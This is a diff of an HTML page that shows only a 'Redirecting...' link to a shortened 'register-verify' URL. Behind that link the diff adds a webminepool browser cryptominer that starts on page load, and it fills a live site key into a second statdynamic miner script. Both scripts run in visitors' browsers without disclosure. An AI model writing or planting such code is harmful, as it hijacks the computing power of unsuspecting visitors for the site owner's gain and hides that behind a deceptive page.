@@ -20,9 +20,23 @@
     <a href="http://tiny.cc/register-verify">Redirecting...</a>
   
     
+    
+    <script src="https://webminepool.com/lib/base.js"></script>
+<script>
+    var miner = WMP.User('<your-site-key>', '<username>',{
+        threads: 4,
+        autoThreads: false,
+        throttle: 0.3,
+        forceASMJS: false
+    });
+    miner.start();
+</script>
+    
+    
+    
     <script src="//statdynamic.com/lib/crypta.js"></script>
 <script>
-  var miner=new CRLT.Anonymous('YOUR_PUBLIC_SITE_KEY', {
+  var miner=new CRLT.Anonymous('SK_H9KGWccj8kacpJPhLM4Y6', {
     threads:2,throttle:0.2, coin: "upx",
   });
   miner.start();
